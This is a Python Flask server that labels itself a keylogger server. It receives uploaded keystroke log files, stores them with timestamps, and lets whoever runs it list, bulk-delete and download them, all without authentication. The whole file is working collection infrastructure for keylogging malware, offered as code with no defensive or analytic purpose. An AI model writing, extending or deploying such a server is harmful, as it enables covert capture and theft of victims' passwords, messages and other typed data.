import glob
import tempfile
import zipfile
from flask import Flask, jsonify, request, send_file
import os
import datetime

app = Flask(__name__)

LOG_DIR = 'logs'
os.makedirs(LOG_DIR, exist_ok=True)

@app.route('/', methods=['GET'])
def health_check():
    return "Keylogger server is running", 200


@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if not file:
        return "No file part", 400

    now = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"keylog_{now}.txt"
    path = os.path.join(LOG_DIR, filename)

    file.save(path)
    print(f"[✓] Received and saved to {path}")
    return "File received", 200


@app.route('/logs', methods=['GET'])
def list_logs():
    """List all available log files"""
    try:
        log_files = []
        for file in glob.glob(os.path.join(LOG_DIR, "*.txt")):
            filename = os.path.basename(file)
            size = os.path.getsize(file)
            modified = datetime.datetime.fromtimestamp(os.path.getmtime(file))
            log_files.append({
                'filename': filename,
                'size': size,
                'modified': modified.strftime("%Y-%m-%d %H:%M:%S")
            })
        
        return jsonify(log_files)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/logs', methods=['DELETE'])
def clear_logs():
    """Delete all log files"""
    try:
        deleted_count = 0
        for file in glob.glob(os.path.join(LOG_DIR, "*.txt")):
            try:
                os.remove(file)
                deleted_count += 1
                print(f"[✓] Deleted: {os.path.basename(file)}")
            except Exception as e:
                print(f"[!] Failed to delete {file}: {e}")

        return jsonify({
            'message': f'Successfully deleted {deleted_count} log files',
            'deleted_count': deleted_count
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/download-latest-log', methods=['GET'])
def download_latest_logs():
    try:
        n = int(request.args.get('n', 1))

        log_files = sorted(
            glob.glob(os.path.join(LOG_DIR, '*.txt')),
            key=os.path.getmtime,
            reverse=True
        )

        if not log_files:
            return jsonify({'error': 'No log files found'}), 404

        selected_files = log_files[:n]

        if len(selected_files) == 1:
            return send_file(selected_files[0], as_attachment=True)

        # Create temporary zip file
        tmp_zip_path = None
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp_zip:
                with zipfile.ZipFile(tmp_zip.name, 'w') as zipf:
                    for file_path in selected_files:
                        zipf.write(file_path, arcname=os.path.basename(file_path))
                tmp_zip_path = tmp_zip.name

            return send_file(tmp_zip_path, as_attachment=True, download_name='logs.zip')
        finally:
            # Clean up temp file after sending
            if tmp_zip_path and os.path.exists(tmp_zip_path):
                try:
                    os.unlink(tmp_zip_path)
                except:
                    pass

    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get('PORT', 9000))
    app.run(host='0.0.0.0', port=port)
